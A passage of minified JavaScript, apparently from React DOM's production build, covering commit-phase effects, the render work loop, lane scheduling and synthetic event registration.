12:xa(n,i,a);break;case 31:xa(n,i,a),a&&c&4&&_d(n,i);break;case 13:xa(n,i,a),a&&c&4&&Hd(n,i);break;case 22:i.memoizedState===null&&xa(n,i,a),Bn(i,i.return);break;case 30:break;default:xa(n,i,a)}t=t.sibling}}function cu(e,t){var a=null;e!==null&&e.memoizedState!==null&&e.memoizedState.cachePool!==null&&(a=e.memoizedState.cachePool.pool),e=null,t.memoizedState!==null&&t.memoizedState.cachePool!==null&&(e=t.memoizedState.cachePool.pool),e!==a&&(e!=null&&e.refCount++,a!=null&&jn(a))}function uu(e,t){e=null,t.alternate!==null&&(e=t.alternate.memoizedState.cache),t=t.memoizedState.cache,t!==e&&(t.refCount++,e!=null&&jn(e))}function Wt(e,t,a,l){if(t.subtreeFlags&10256)for(t=t.child;t!==null;)Ud(e,t,a,l),t=t.sibling}function Ud(e,t,a,l){var n=t.flags;switch(t.tag){case 0:case 11:case 15:Wt(e,t,a,l),n&2048&&Un(9,t);break;case 1:Wt(e,t,a,l);break;case 3:Wt(e,t,a,l),n&2048&&(e=null,t.alternate!==null&&(e=t.alternate.memoizedState.cache),t=t.memoizedState.cache,t!==e&&(t.refCount++,e!=null&&jn(e)));break;case 12:if(n&2048){Wt(e,t,a,l),e=t.stateNode;try{var i=t.memoizedProps,c=i.id,u=i.onPostCommit;typeof u=="function"&&u(c,t.alternate===null?"mount":"update",e.passiveEffectDuration,-0)}catch(r){Ee(t,t.return,r)}}else Wt(e,t,a,l);break;case 31:Wt(e,t,a,l);break;case 13:Wt(e,t,a,l);break;case 23:break;case 22:i=t.stateNode,c=t.alternate,t.memoizedState!==null?i._visibility&2?Wt(e,t,a,l):Yn(e,t):i._visibility&2?Wt(e,t,a,l):(i._visibility|=2,Wl(e,t,a,l,(t.subtreeFlags&10256)!==0||!1)),n&2048&&cu(c,t);break;case 24:Wt(e,t,a,l),n&2048&&uu(t.alternate,t);break;default:Wt(e,t,a,l)}}function Wl(e,t,a,l,n){for(n=n&&((t.subtreeFlags&10256)!==0||!1),t=t.child;t!==null;){var i=e,c=t,u=a,r=l,y=c.flags;switch(c.tag){case 0:case 11:case 15:Wl(i,c,u,r,n),Un(8,c);break;case 23:break;case 22:var x=c.stateNode;c.memoizedState!==null?x._visibility&2?Wl(i,c,u,r,n):Yn(i,c):(x._visibility|=2,Wl(i,c,u,r,n)),n&&y&2048&&cu(c.alternate,c);break;case 24:Wl(i,c,u,r,n),n&&y&2048&&uu(c.alternate,c);break;default:Wl(i,c,u,r,n)}t=t.sibling}}function Yn(e,t){if(t.subtreeFlags&10256)for(t=t.child;t!==null;){var a=e,l=t,n=l.flags;switch(l.tag){case 22:Yn(a,l),n&2048&&cu(l.alternate,l);break;case 24:Yn(a,l),n&2048&&uu(l.alternate,l);break;default:Yn(a,l)}t=t.sibling}}var qn=8192;function Jl(e,t,a){if(e.subtreeFlags&qn)for(e=e.child;e!==null;)Bd(e,t,a),e=e.sibling}function Bd(e,t,a){switch(e.tag){case 26:Jl(e,t,a),e.flags&qn&&e.memoizedState!==null&&Np(a,Zt,e.memoizedState,e.memoizedProps);break;case 5:Jl(e,t,a);break;case 3:case 4:var l=Zt;Zt=ms(e.stateNode.containerInfo),Jl(e,t,a),Zt=l;break;case 22:e.memoizedState===null&&(l=e.alternate,l!==null&&l.memoizedState!==null?(l=qn,qn=16777216,Jl(e,t,a),qn=l):Jl(e,t,a));break;default:Jl(e,t,a)}}function Yd(e){var t=e.alternate;if(t!==null&&(e=t.child,e!==null)){t.child=null;do t=e.sibling,e.sibling=null,e=t;while(e!==null)}}function Gn(e){var t=e.deletions;if((e.flags&16)!==0){if(t!==null)for(var a=0;a<t.length;a++){var l=t[a];it=l,Gd(l,e)}Yd(e)}if(e.subtreeFlags&10256)for(e=e.child;e!==null;)qd(e),e=e.sibling}function qd(e){switch(e.tag){case 0:case 11:case 15:Gn(e),e.flags&2048&&Ra(9,e,e.return);break;case 3:Gn(e);break;case 12:Gn(e);break;case 22:var t=e.stateNode;e.memoizedState!==null&&t._visibility&2&&(e.return===null||e.return.tag!==13)?(t._visibility&=-3,ts(e)):Gn(e);break;default:Gn(e)}}function ts(e){var t=e.deletions;if((e.flags&16)!==0){if(t!==null)for(var a=0;a<t.length;a++){var l=t[a];it=l,Gd(l,e)}Yd(e)}for(e=e.child;e!==null;){switch(t=e,t.tag){case 0:case 11:case 15:Ra(8,t,t.return),ts(t);break;case 22:a=t.stateNode,a._visibility&2&&(a._visibility&=-3,ts(t));break;default:ts(t)}e=e.sibling}}function Gd(e,t){for(;it!==null;){var a=it;switch(a.tag){case 0:case 11:case 15:Ra(8,a,t);break;case 23:case 22:if(a.memoizedState!==null&&a.memoizedState.cachePool!==null){var l=a.memoizedState.cachePool.pool;l!=null&&l.refCount++}break;case 24:jn(a.memoizedState.cache)}if(l=a.child,l!==null)l.return=a,it=l;else e:for(a=e;it!==null;){l=it;var n=l.sibling,i=l.return;if(Md(l),l===a){it=null;break e}if(n!==null){n.return=i,it=n;break e}it=i}}}var Um={getCacheForType:function(e){var t=ut(Je),a=t.data.get(e);return a===void 0&&(a=e(),t.data.set(e,a)),a},cacheSignal:function(){return ut(Je).controller.signal}},Bm=typeof WeakMap=="function"?WeakMap:Map,Te=0,ke=null,fe=null,me=0,Ae=0,kt=null,La=!1,Fl=!1,ou=!1,Ta=0,qe=0,Ua=0,yl=0,ru=0,Mt=0,$l=0,Vn=null,Nt=null,du=!1,as=0,Vd=0,ls=1/0,ns=null,Ba=null,et=0,Ya=null,Il=null,Na=0,fu=0,hu=null,Xd=null,Xn=0,mu=null;function Dt(){return(Te&2)!==0&&me!==0?me&-me:b.T!==null?bu():E()}function Qd(){if(Mt===0)if((me&536870912)===0||ge){var e=xl;xl<<=1,(xl&3932160)===0&&(xl=262144),Mt=e}else Mt=536870912;return e=Ot.current,e!==null&&(e.flags|=32),Mt}function Ct(e,t,a){(e===ke&&(Ae===2||Ae===9)||e.cancelPendingCommit!==null)&&(Pl(e,0),qa(e,me,Mt,!1)),Ia(e,a),((Te&2)===0||e!==ke)&&(e===ke&&((Te&2)===0&&(yl|=a),qe===4&&qa(e,me,Mt,!1)),ea(e))}function Kd(e,t,a){if((Te&6)!==0)throw Error(m(327));var l=!a&&(t&127)===0&&(t&e.expiredLanes)===0||$a(e,t),n=l?Gm(e,t):yu(e,t,!0),i=l;do{if(n===0){Fl&&!l&&qa(e,t,0,!1);break}else{if(a=e.current.alternate,i&&!Ym(a)){n=yu(e,t,!1),i=!1;continue}if(n===2){if(i=t,e.errorRecoveryDisabledLanes&i)var c=0;else c=e.pendingLanes&-536870913,c=c!==0?c:c&536870912?536870912:0;if(c!==0){t=c;e:{var u=e;n=Vn;var r=u.current.memoizedState.isDehydrated;if(r&&(Pl(u,c).flags|=256),c=yu(u,c,!1),c!==2){if(ou&&!r){u.errorRecoveryDisabledLanes|=i,yl|=i,n=4;break e}i=Nt,Nt=n,i!==null&&(Nt===null?Nt=i:Nt.push.apply(Nt,i))}n=c}if(i=!1,n!==2)continue}}if(n===1){Pl(e,0),qa(e,t,0,!0);break}e:{switch(l=e,i=n,i){case 0:case 1:throw Error(m(345));case 4:if((t&4194048)!==t)break;case 6:qa(l,t,Mt,!La);break e;case 2:Nt=null;break;case 3:case 5:break;default:throw Error(m(329))}if((t&62914560)===t&&(n=as+300-pt(),10<n)){if(qa(l,t,Mt,!La),Nl(l,0,!0)!==0)break e;Na=t,l.timeoutHandle=Cf(Zd.bind(null,l,a,Nt,ns,du,t,Mt,yl,$l,La,i,"Throttled",-0,0),n);break e}Zd(l,a,Nt,ns,du,t,Mt,yl,$l,La,i,null,-0,0)}}break}while(!0);ea(e)}function Zd(e,t,a,l,n,i,c,u,r,y,x,A,g,v){if(e.timeoutHandle=-1,A=t.subtreeFlags,A&8192||(A&16785408)===16785408){A={stylesheets:null,count:0,imgCount:0,imgBytes:0,suspenseyImages:[],waitingForImages:!0,waitingForViewTransition:!1,unsuspend:ua},Bd(t,i,A);var U=(i&62914560)===i?as-pt():(i&4194048)===i?Vd-pt():0;if(U=Cp(A,U),U!==null){Na=i,e.cancelPendingCommit=U(tf.bind(null,e,t,i,a,l,n,c,u,r,x,A,null,g,v)),qa(e,i,c,!y);return}}tf(e,t,i,a,l,n,c,u,r)}function Ym(e){for(var t=e;;){var a=t.tag;if((a===0||a===11||a===15)&&t.flags&16384&&(a=t.updateQueue,a!==null&&(a=a.stores,a!==null)))for(var l=0;l<a.length;l++){var n=a[l],i=n.getSnapshot;n=n.value;try{if(!Et(i(),n))return!1}catch{return!1}}if(a=t.child,t.subtreeFlags&16384&&a!==null)a.return=t,t=a;else{if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return!0;t=t.return}t.sibling.return=t.return,t=t.sibling}}return!0}function qa(e,t,a,l){t&=~ru,t&=~yl,e.suspendedLanes|=t,e.pingedLanes&=~t,l&&(e.warmLanes|=t),l=e.expirationTimes;for(var n=t;0<n;){var i=31-gt(n),c=1<<i;l[i]=-1,n&=~c}a!==0&&Cl(e,a,t)}function is(){return(Te&6)===0?(Qn(0),!1):!0}function pu(){if(fe!==null){if(Ae===0)var e=fe.return;else e=fe,fa=cl=null,kc(e),Vl=null,En=0,e=fe;for(;e!==null;)Cd(e.alternate,e),e=e.return;fe=null}}function Pl(e,t){var a=e.timeoutHandle;a!==-1&&(e.timeoutHandle=-1,sp(a)),a=e.cancelPendingCommit,a!==null&&(e.cancelPendingCommit=null,a()),Na=0,pu(),ke=e,fe=a=ra(e.current,null),me=t,Ae=0,kt=null,La=!1,Fl=$a(e,t),ou=!1,$l=Mt=ru=yl=Ua=qe=0,Nt=Vn=null,du=!1,(t&8)!==0&&(t|=t&32);var l=e.entangledLanes;if(l!==0)for(e=e.entanglements,l&=t;0<l;){var n=31-gt(l),i=1<<n;t|=e[n],l&=~i}return Ta=t,Ai(),a}function Wd(e,t){le=null,b.H=Hn,t===Gl||t===_i?(t=rr(),Ae=3):t===Sc?(t=rr(),Ae=4):Ae=t===Zc?8:t!==null&&typeof t=="object"&&typeof t.then=="function"?6:1,kt=t,fe===null&&(qe=1,Wi(e,Ut(t,e.current)))}function Jd(){var e=Ot.current;return e===null?!0:(me&4194048)===me?Gt===null:(me&62914560)===me||(me&536870912)!==0?e===Gt:!1}function Fd(){var e=b.H;return b.H=Hn,e===null?Hn:e}function $d(){var e=b.A;return b.A=Um,e}function ss(){qe=4,La||(me&4194048)!==me&&Ot.current!==null||(Fl=!0),(Ua&134217727)===0&&(yl&134217727)===0||ke===null||qa(ke,me,Mt,!1)}function yu(e,t,a){var l=Te;Te|=2;var n=Fd(),i=$d();(ke!==e||me!==t)&&(ns=null,Pl(e,t)),t=!1;var c=qe;e:do try{if(Ae!==0&&fe!==null){var u=fe,r=kt;switch(Ae){case 8:pu(),c=6;break e;case 3:case 2:case 9:case 6:Ot.current===null&&(t=!0);var y=Ae;if(Ae=0,kt=null,en(e,u,r,y),a&&Fl){c=0;break e}break;default:y=Ae,Ae=0,kt=null,en(e,u,r,y)}}qm(),c=qe;break}catch(x){Wd(e,x)}while(!0);return t&&e.shellSuspendCounter++,fa=cl=null,Te=l,b.H=n,b.A=i,fe===null&&(ke=null,me=0,Ai()),c}function qm(){for(;fe!==null;)Id(fe)}function Gm(e,t){var a=Te;Te|=2;var l=Fd(),n=$d();ke!==e||me!==t?(ns=null,ls=pt()+500,Pl(e,t)):Fl=$a(e,t);e:do try{if(Ae!==0&&fe!==null){t=fe;var i=kt;t:switch(Ae){case 1:Ae=0,kt=null,en(e,t,i,1);break;case 2:case 9:if(ur(i)){Ae=0,kt=null,Pd(t);break}t=function(){Ae!==2&&Ae!==9||ke!==e||(Ae=7),ea(e)},i.then(t,t);break e;case 3:Ae=7;break e;case 4:Ae=5;break e;case 7:ur(i)?(Ae=0,kt=null,Pd(t)):(Ae=0,kt=null,en(e,t,i,7));break;case 5:var c=null;switch(fe.tag){case 26:c=fe.memoizedState;case 5:case 27:var u=fe;if(c?Bf(c):u.stateNode.complete){Ae=0,kt=null;var r=u.sibling;if(r!==null)fe=r;else{var y=u.return;y!==null?(fe=y,cs(y)):fe=null}break t}}Ae=0,kt=null,en(e,t,i,5);break;case 6:Ae=0,kt=null,en(e,t,i,6);break;case 8:pu(),qe=6;break e;default:throw Error(m(462))}}Vm();break}catch(x){Wd(e,x)}while(!0);return fa=cl=null,b.H=l,b.A=n,Te=a,fe!==null?0:(ke=null,me=0,Ai(),qe)}function Vm(){for(;fe!==null&&!ks();)Id(fe)}function Id(e){var t=Td(e.alternate,e,Ta);e.memoizedProps=e.pendingProps,t===null?cs(e):fe=t}function Pd(e){var t=e,a=t.alternate;switch(t.tag){case 15:case 0:t=yd(a,t,t.pendingProps,t.type,void 0,me);break;case 11:t=yd(a,t,t.pendingProps,t.type.render,t.ref,me);break;case 5:kc(t);default:Cd(a,t),t=fe=$o(t,Ta),t=Td(a,t,Ta)}e.memoizedProps=e.pendingProps,t===null?cs(e):fe=t}function en(e,t,a,l){fa=cl=null,kc(t),Vl=null,En=0;var n=t.return;try{if(km(e,n,t,a,me)){qe=1,Wi(e,Ut(a,e.current)),fe=null;return}}catch(i){if(n!==null)throw fe=n,i;qe=1,Wi(e,Ut(a,e.current)),fe=null;return}t.flags&32768?(ge||l===1?e=!0:Fl||(me&536870912)!==0?e=!1:(La=e=!0,(l===2||l===9||l===3||l===6)&&(l=Ot.current,l!==null&&l.tag===13&&(l.flags|=16384))),ef(t,e)):cs(t)}function cs(e){var t=e;do{if((t.flags&32768)!==0){ef(t,La);return}e=t.return;var a=_m(t.alternate,t,Ta);if(a!==null){fe=a;return}if(t=t.sibling,t!==null){fe=t;return}fe=t=e}while(t!==null);qe===0&&(qe=5)}function ef(e,t){do{var a=Hm(e.alternate,e);if(a!==null){a.flags&=32767,fe=a;return}if(a=e.return,a!==null&&(a.flags|=32768,a.subtreeFlags=0,a.deletions=null),!t&&(e=e.sibling,e!==null)){fe=e;return}fe=e=a}while(e!==null);qe=6,fe=null}function tf(e,t,a,l,n,i,c,u,r){e.cancelPendingCommit=null;do us();while(et!==0);if((Te&6)!==0)throw Error(m(327));if(t!==null){if(t===e.current)throw Error(m(177));if(i=t.lanes|t.childLanes,i|=nc,hn(e,a,i,c,u,r),e===ke&&(fe=ke=null,me=0),Il=t,Ya=e,Na=a,fu=i,hu=n,Xd=l,(t.subtreeFlags&10256)!==0||(t.flags&10256)!==0?(e.callbackNode=null,e.callbackPriority=0,Zm(Sl,function(){return cf(),null})):(e.callbackNode=null,e.callbackPriority=0),l=(t.flags&13878)!==0,(t.subtreeFlags&13878)!==0||l){l=b.T,b.T=null,n=k.p,k.p=2,c=Te,Te|=4;try{Rm(e,t,a)}finally{Te=c,k.p=n,b.T=l}}et=1,af(),lf(),nf()}}function af(){if(et===1){et=0;var e=Ya,t=Il,a=(t.flags&13878)!==0;if((t.subtreeFlags&13878)!==0||a){a=b.T,b.T=null;var l=k.p;k.p=2;var n=Te;Te|=4;try{Rd(t,e);var i=wu,c=Go(e.containerInfo),u=i.focusedElem,r=i.selectionRange;if(c!==u&&u&&u.ownerDocument&&qo(u.ownerDocument.documentElement,u)){if(r!==null&&Ps(u)){var y=r.start,x=r.end;if(x===void 0&&(x=y),"selectionStart"in u)u.selectionStart=y,u.selectionEnd=Math.min(x,u.value.length);else{var A=u.ownerDocument||document,g=A&&A.defaultView||window;if(g.getSelection){var v=g.getSelection(),U=u.textContent.length,W=Math.min(r.start,U),ze=r.end===void 0?W:Math.min(r.end,U);!v.extend&&W>ze&&(c=ze,ze=W,W=c);var h=Yo(u,W),f=Yo(u,ze);if(h&&f&&(v.rangeCount!==1||v.anchorNode!==h.node||v.anchorOffset!==h.offset||v.focusNode!==f.node||v.focusOffset!==f.offset)){var p=A.createRange();p.setStart(h.node,h.offset),v.removeAllRanges(),W>ze?(v.addRange(p),v.extend(f.node,f.offset)):(p.setEnd(f.node,f.offset),v.addRange(p))}}}}for(A=[],v=u;v=v.parentNode;)v.nodeType===1&&A.push({element:v,left:v.scrollLeft,top:v.scrollTop});for(typeof u.focus=="function"&&u.focus(),u=0;u<A.length;u++){var C=A[u];C.element.scrollLeft=C.left,C.element.scrollTop=C.top}}bs=!!Eu,wu=Eu=null}finally{Te=n,k.p=l,b.T=a}}e.current=t,et=2}}function lf(){if(et===2){et=0;var e=Ya,t=Il,a=(t.flags&8772)!==0;if((t.subtreeFlags&8772)!==0||a){a=b.T,b.T=null;var l=k.p;k.p=2;var n=Te;Te|=4;try{kd(e,t.alternate,t)}finally{Te=n,k.p=l,b.T=a}}et=3}}function nf(){if(et===4||et===3){et=0,Ms();var e=Ya,t=Il,a=Na,l=Xd;(t.subtreeFlags&10256)!==0||(t.flags&10256)!==0?et=5:(et=0,Il=Ya=null,sf(e,e.pendingLanes));var n=e.pendingLanes;if(n===0&&(Ba=null),S(a),t=t.stateNode,yt&&typeof yt.onCommitFiberRoot=="function")try{yt.onCommitFiberRoot(Fa,t,void 0,(t.current.flags&128)===128)}catch{}if(l!==null){t=b.T,n=k.p,k.p=2,b.T=null;try{for(var i=e.onRecoverableError,c=0;c<l.length;c++){var u=l[c];i(u.value,{componentStack:u.stack})}}finally{b.T=t,k.p=n}}(Na&3)!==0&&us(),ea(e),n=e.pendingLanes,(a&261930)!==0&&(n&42)!==0?e===mu?Xn++:(Xn=0,mu=e):Xn=0,Qn(0)}}function sf(e,t){(e.pooledCacheLanes&=t)===0&&(t=e.pooledCache,t!=null&&(e.pooledCache=null,jn(t)))}function us(){return af(),lf(),nf(),cf()}function cf(){if(et!==5)return!1;var e=Ya,t=fu;fu=0;var a=S(Na),l=b.T,n=k.p;try{k.p=32>a?32:a,b.T=null,a=hu,hu=null;var i=Ya,c=Na;if(et=0,Il=Ya=null,Na=0,(Te&6)!==0)throw Error(m(331));var u=Te;if(Te|=4,qd(i.current),Ud(i,i.current,c,a),Te=u,Qn(0,!1),yt&&typeof yt.onPostCommitFiberRoot=="function")try{yt.onPostCommitFiberRoot(Fa,i)}catch{}return!0}finally{k.p=n,b.T=l,sf(e,t)}}function uf(e,t,a){t=Ut(a,t),t=Kc(e.stateNode,t,2),e=Da(e,t,2),e!==null&&(Ia(e,2),ea(e))}function Ee(e,t,a){if(e.tag===3)uf(e,e,a);else for(;t!==null;){if(t.tag===3){uf(t,e,a);break}else if(t.tag===1){var l=t.stateNode;if(typeof t.type.getDerivedStateFromError=="function"||typeof l.componentDidCatch=="function"&&(Ba===null||!Ba.has(l))){e=Ut(a,e),a=ud(2),l=Da(t,a,2),l!==null&&(od(a,l,t,e),Ia(l,2),ea(l));break}}t=t.return}}function gu(e,t,a){var l=e.pingCache;if(l===null){l=e.pingCache=new Bm;var n=new Set;l.set(t,n)}else n=l.get(t),n===void 0&&(n=new Set,l.set(t,n));n.has(a)||(ou=!0,n.add(a),e=Xm.bind(null,e,t,a),t.then(e,e))}function Xm(e,t,a){var l=e.pingCache;l!==null&&l.delete(t),e.pingedLanes|=e.suspendedLanes&a,e.warmLanes&=~a,ke===e&&(me&a)===a&&(qe===4||qe===3&&(me&62914560)===me&&300>pt()-as?(Te&2)===0&&Pl(e,0):ru|=a,$l===me&&($l=0)),ea(e)}function of(e,t){t===0&&(t=fi()),e=nl(e,t),e!==null&&(Ia(e,t),ea(e))}function Qm(e){var t=e.memoizedState,a=0;t!==null&&(a=t.retryLane),of(e,a)}function Km(e,t){var a=0;switch(e.tag){case 31:case 13:var l=e.stateNode,n=e.memoizedState;n!==null&&(a=n.retryLane);break;case 19:l=e.stateNode;break;case 22:l=e.stateNode._retryCache;break;default:throw Error(m(314))}l!==null&&l.delete(t),of(e,a)}function Zm(e,t){return vl(e,t)}var os=null,tn=null,vu=!1,rs=!1,Su=!1,Ga=0;function ea(e){e!==tn&&e.next===null&&(tn===null?os=tn=e:tn=tn.next=e),rs=!0,vu||(vu=!0,Jm())}function Qn(e,t){if(!Su&&rs){Su=!0;do for(var a=!1,l=os;l!==null;){if(e!==0){var n=l.pendingLanes;if(n===0)var i=0;else{var c=l.suspendedLanes,u=l.pingedLanes;i=(1<<31-gt(42|e)+1)-1,i&=n&~(c&~u),i=i&201326741?i&201326741|1:i?i|2:0}i!==0&&(a=!0,hf(l,i))}else i=me,i=Nl(l,l===ke?i:0,l.cancelPendingCommit!==null||l.timeoutHandle!==-1),(i&3)===0||$a(l,i)||(a=!0,hf(l,i));l=l.next}while(a);Su=!1}}function Wm(){rf()}function rf(){rs=vu=!1;var e=0;Ga!==0&&ip()&&(e=Ga);for(var t=pt(),a=null,l=os;l!==null;){var n=l.next,i=df(l,t);i===0?(l.next=null,a===null?os=n:a.next=n,n===null&&(tn=a)):(a=l,(e!==0||(i&3)!==0)&&(rs=!0)),l=n}et!==0&&et!==5||Qn(e),Ga!==0&&(Ga=0)}function df(e,t){for(var a=e.suspendedLanes,l=e.pingedLanes,n=e.expirationTimes,i=e.pendingLanes&-62914561;0<i;){var c=31-gt(i),u=1<<c,r=n[c];r===-1?((u&a)===0||(u&l)!==0)&&(n[c]=Rs(u,t)):r<=t&&(e.expiredLanes|=u),i&=~u}if(t=ke,a=me,a=Nl(e,e===t?a:0,e.cancelPendingCommit!==null||e.timeoutHandle!==-1),l=e.callbackNode,a===0||e===t&&(Ae===2||Ae===9)||e.cancelPendingCommit!==null)return l!==null&&l!==null&&rn(l),e.callbackNode=null,e.callbackPriority=0;if((a&3)===0||$a(e,a)){if(t=a&-a,t===e.callbackPriority)return t;switch(l!==null&&rn(l),S(a)){case 2:case 8:a=ui;break;case 32:a=Sl;break;case 268435456:a=oi;break;default:a=Sl}return l=ff.bind(null,e),a=vl(a,l),e.callbackPriority=t,e.callbackNode=a,t}return l!==null&&l!==null&&rn(l),e.callbackPriority=2,e.callbackNode=null,2}function ff(e,t){if(et!==0&&et!==5)return e.callbackNode=null,e.callbackPriority=0,null;var a=e.callbackNode;if(us()&&e.callbackNode!==a)return null;var l=me;return l=Nl(e,e===ke?l:0,e.cancelPendingCommit!==null||e.timeoutHandle!==-1),l===0?null:(Kd(e,l,t),df(e,pt()),e.callbackNode!=null&&e.callbackNode===a?ff.bind(null,e):null)}function hf(e,t){if(us())return null;Kd(e,t,!0)}function Jm(){cp(function(){(Te&6)!==0?vl(ci,Wm):rf()})}function bu(){if(Ga===0){var e=Yl;e===0&&(e=bl,bl<<=1,(bl&261888)===0&&(bl=256)),Ga=e}return Ga}function mf(e){return e==null||typeof e=="symbol"||typeof e=="boolean"?null:typeof e=="function"?e:vi(""+e)}function pf(e,t){var a=t.ownerDocument.createElement("input");return a.name=t.name,a.value=t.value,e.id&&a.setAttribute("form",e.id),t.parentNode.insertBefore(a,t),e=new FormData(e),a.parentNode.removeChild(a),e}function Fm(e,t,a,l,n){if(t==="submit"&&a&&a.stateNode===n){var i=mf((n[de]||null).action),c=l.submitter;c&&(t=(t=c[de]||null)?mf(t.formAction):c.getAttribute("formAction"),t!==null&&(i=t,c=null));var u=new Ti("action","action",null,l,n);e.push({event:u,listeners:[{instance:null,listener:function(){if(l.defaultPrevented){if(Ga!==0){var r=c?pf(n,c):new FormData(n);Yc(a,{pending:!0,data:r,method:n.method,action:i},null,r)}}else typeof i=="function"&&(u.preventDefault(),r=c?pf(n,c):new FormData(n),Yc(a,{pending:!0,data:r,method:n.method,action:i},i,r))},currentTarget:n}]})}}for(var xu=0;xu<lc.length;xu++){var Tu=lc[xu],$m=Tu.toLowerCase(),Im=Tu[0].toUpperCase()+Tu.slice(1);Kt($m,"on"+Im)}Kt(Qo,"onAnimationEnd"),Kt(Ko,"onAnimationIteration"),Kt(Zo,"onAnimationStart"),Kt("dblclick","onDoubleClick"),Kt("focusin","onFocus"),Kt("focusout","onBlur"),Kt(mm,"onTransitionRun"),Kt(pm,"onTransitionStart"),Kt(ym,"onTransitionCancel"),Kt(Wo,"onTransitionEnd"),Al("onMouseEnter",["mouseout","mouseover"]),Al("onMouseLeave",["mouseout","mouseover"]),Al("onPointerEnter",["pointerout","pointerover"]),Al("onPointerLeave",["pointerout","pointerover"]),el("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),el("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),el("onBeforeInput",["compositionend","keypress","textInput","paste"]),el("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),el("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),el("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Kn="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Pm=new Set("beforetoggle cancel close invalid load scroll scrollend toggle".split(" ").concat(Kn));function yf(e,t){t=(t&4)!==0;for(var a=0;a<e.length;a++){var l=e[a],n=l.event;l=l.listeners;e:{var i=void 0;if(t)for(var c=l.length-1;0<=c;c--){var u=l[c],r=u.instance,y=u.currentTarget;if(u=u.listener,r!==i&&n.isPropagationStopped())break e;i=u,n.currentTarget=y;try{i(n)}catch(x){ji(x)}n.currentTarget=null,i=r}else for(c=0;c<l.length;c++){if(u=l[c],r=u.instance,y=u.currentTarget,u=u.listener,r!==i&&n.isPropagationStopped())break e;i=u,n.currentTarget=y;try{i(n)}catch(x){ji(x)}n.currentTarget=null,i=r}}}}function he(e,t){var a=t[jt];a===void 0&&(a=t[jt]=new Set);var l=e+"__bubble";a.has(l)||(gf(t,e,2,!1),a.add(l))}function Nu(e,t,a){var l=0;t&&(l|=4),gf(a,e,l,t)}var ds="_reactListening"+Math.random().toString(36).slice(2);function Cu(e){if(!e[ds]){e[ds]=!0,uo.forEach(function(a){a!=="selectionchange"&&(Pm.has(a)||Nu(a,!1,e),Nu(a,!0,e))});var t=e.nodeType===9?e:e.ownerDocument;t===null||t[ds]||(t[ds]=!0,Nu("selectionchange",!1,t))}}function gf(e,t,a,l){switch(Kf(t)){case 2:var n=Ep;break;case 8:n=wp;break;default:n=Bu}a=n.bind(null,t,a,e),n=void 0,!Xs||t!=="touchstart"&&t!=="touchmove"&&t!=="wheel"||(n=!0),l?n!==void 0?e.addEventListener(t,a,{capture:!0,passive:n}):e.addEventListener(t,a,!0):n!==void 0?e.addEventListener(t,a,{passive:n}):e.addEventListener(t,a,!1)}function ju(e,t,a,l,n){var i=l;if((t&1)===0&&(t&2)===0&&l!==null)e:for(;;){if(l===null)return;var c=l.tag;if(c===3||c===4){var u=l.stateNode.containerInfo;if(u===n)break;if(c===4)for(c=l.return;c!==null;){var r=c.tag;if((r===3||r===4)&&c.stateNode.containerInfo===n)return;c=c.return}for(;u!==null;){if(c=lt(u),c===null)return;if(r=c.tag,r===5||r===6||r===26||r===27){l=i=c;continue e}u=u.parentNode}}l=l.return}xo(function(){var y=i,x=Gs(a),A=[];e:{var g=Jo.get(e);if(g!==void 0){var v=Ti,U=e;switch(e){case"keypress":if(bi(a)===0)break e;case"keydown":case"keyup":v=Kh;break;case"focusin":U="focus",v=Ws;break;case"focusout":U="blur",v=Ws;break;case"beforeblur":case"afterblur":v=Ws;break;case"click":if(a.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":v=Co;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":v=_h;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":v=Jh;break;case Qo:case Ko:case Zo:v=Lh;break;case Wo:v=$h;break;case"scroll":case"scrollend":v=Mh;break;case"wheel":v=Ph;break;case"copy":case"cut":case"paste":v=Bh;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":v=Ao;break;case"toggle":case"beforetoggle":v=tm}var W=(t&4)!==0,ze=!W&&(e==="scroll"||e==="scrollend"),h=W?g!==null?g+"Capture":null:g;W=[];for(var f=y,p;f!==null;){var C=f;if(p=C.stateNode,C=C.tag,C!==5&&C!==26&&C!==27||p===null||h===null||(C=mn(f,h),C!=null&&W.push(Zn(f,C,p))),ze)break;f=f.return}0<W.length&&(g=new v(g,U,null,a,x),A.push({event:g,listeners:W}))}}if((t&7)===0){e:{if(g=e==="mouseover"||e==="pointerover",v=e==="mouseout"||e==="pointerout",g&&a!==qs&&(U=a.relatedTarget||a.fromElement)&&(lt(U)||U[Le]))break e;if((v||g)&&(g=x.window===x?x:(g=x.ownerDocument)?g.defaultView||g.parentWindow:window,v?(U=a.relatedTarget||a.toElement,v=y,U=U?lt(U):null,U!==null&&(ze=J(U),W=U.tag,U!==ze||W!==5&&W!==27&&W!==6)&&(U=null)):(v=null,U=y),v!==U)){if(W=Co,C="onMouseLeave",h="onMouseEnter",f="mouse",(e==="pointerout"||e==="pointerover")&&(W=Ao,C="onPointerLeave",h="onPointerEnter",f="pointer"),ze=v==null?g:sa(v),p=U==null?g:sa(U),g=new W(C,f+"leave",v,a,x),g.target=ze,g.relatedTarget=p,C=null,lt(x)===y&&(W=new W(h,f+"enter",U,a,x),W.target=p,W.relatedTarget=ze,C=W),ze=C,v&&U)t:{for(W=ep,h=v,f=U,p=0,C=h;C;C=W(C))p++;C=0;for(var K=f;K;K=W(K))C++;for(;0<p-C;)h=W(h),p--;for(;0<C-p;)f=W(f),C--;for(;p--;){if(h===f||f!==null&&h===f.alternate){W=h;break t}h=W(h),f=W(f)}W=null}else W=null;v!==null&&vf(A,g,v,W,!1),U!==null&&ze!==null&&vf(A,ze,U,W,!0)}}e:{if(g=y?sa(y):window,v=g.nodeName&&g.nodeName.toLowerCase(),v==="select"||v==="input"&&g.type==="file")var Se=_o;else 